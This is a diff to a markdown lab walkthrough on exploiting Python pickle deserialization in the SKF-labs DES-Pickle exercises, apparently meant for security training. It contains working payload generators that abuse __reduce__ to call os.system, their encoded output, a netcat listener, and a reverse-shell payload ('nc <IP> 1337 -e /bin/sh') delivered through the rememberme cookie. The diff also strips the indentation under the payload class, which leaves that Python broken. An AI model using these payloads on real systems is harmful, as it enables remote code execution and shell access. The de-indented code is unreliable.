@@ -337,7 +337,8 @@ def deserialization():
     - A tuple of arguments to pass to the callable object. If the callable doesn't accept any arguments, an empty tuple must be provided.
    
 - In order to exploit it, we need to create a serialize data. Pickle allows different objects to declare how they should be pickled using the **__reduce__** method. Whenever an object is pickled, the **__reduce__** method defined by it gets called. 
-- In the below code we are just defining a class **test123** which contains the **__reduce__method**, it returns a callable object as **os.system()** and a tuple of arguments as **sleep 5**.
+- In the below code we are just defining a class **test123** which contains the **__reduce__method**, it returns a callable object as **os.system()** and a tuple of arguments as **sleep 5**.<br>
+
 ```python
 import os
 import pickle
@@ -355,7 +356,8 @@ python3 deseee.py
 b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x07sleep 5\x94\x85\x94R\x94.'
 ```
 - Since the application DES-Pickle.py have bytes.fromhex() method implemented, we need to convert the above binary into hex. We can do it using binascii.hexlify(). It makes our final payload as
-```python3
+
+```python
 import os
 import pickle
 import binascii
@@ -365,7 +367,7 @@ class test123():
 		return (os.system, ('sleep 5',))
 
 data123 = pickle.dumps(test123())
-print(binascii.hexlify(data123)
+print(binascii.hexlify(data123))
 ```
 - Run the code again.
 ```bash
@@ -378,6 +380,7 @@ b'80049522000000000000008c05706f736978948c0673797374656d9493948c07736c6565702035
 
 ### Deserialization on Python: DES-Pickle-2
 - Clone the same github repository as above.
+
 ```bash
 git clone https://github.com/blabla1337/skf-labs.git
 cd skf-labs/python/DES-Pickle-2
@@ -389,6 +392,7 @@ python3 Login.py
 - The application seems to have a login and registration page.
 - Let's directly jump into the source code. Open the `Login.py` file.
 - Between line 26 and 34 we can see that the application has implemented python pickle module.
+
 ```python
 @app.route("/login", methods=['GET', 'POST'])
 def login():
@@ -402,18 +406,20 @@ def login():
 ```
 - Here the code shows that whenever a **GET** or **POST** method is initiated on the **/login** endpoint, the **login()** method is triggered. The parameter **rememberme** is expected on the cookies and after decompiling the cookies with base64 decode, it is passed into the **pickle.load()** method. 
 - Let's create a python script.
+
 ```python
 import pickle
 import base64
 import os
 
 class payloads(object):
-  def __reduce__(self):
-      return (os.system,("sleep 5",))
+def __reduce__(self):
+    return (os.system,("sleep 5",))
 
 print(base64.b64encode(pickle.dumps(payloads())))
 ```
 - Here we defined a class and created a **__reduce__** method which returns the tuple value. The object is dumped using pickle.dumps, encoded with base64 encoder and printed.
+
 ```bash
 python3 exploit.py
 b'ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu'
@@ -425,18 +431,20 @@ b'ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu'
 - Replace the **rememberme** parameter value with **ASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu**<br>
 - Check if the application responds after 5 seconds. If yes, the exploit is possible.
 - Listen to traffic using netcat
+
 ```bash
 nc -lvnp 1337
 ```
 - Create a script **exploit.py** again and insert the reverse shell payload as below.
+
 ```python
 import pickle
 import base64
 import os
 
 class payloads(object):
-  def __reduce__(self):
-      return (os.system,("nc <IP> 1337 -e /bin/sh",)) # replace <IP> 
+def __reduce__(self):
+    return (os.system,("nc <IP> 1337 -e /bin/sh",)) # replace <IP> 
 
 print(base64.b64encode(pickle.dumps(payloads())))
 ```
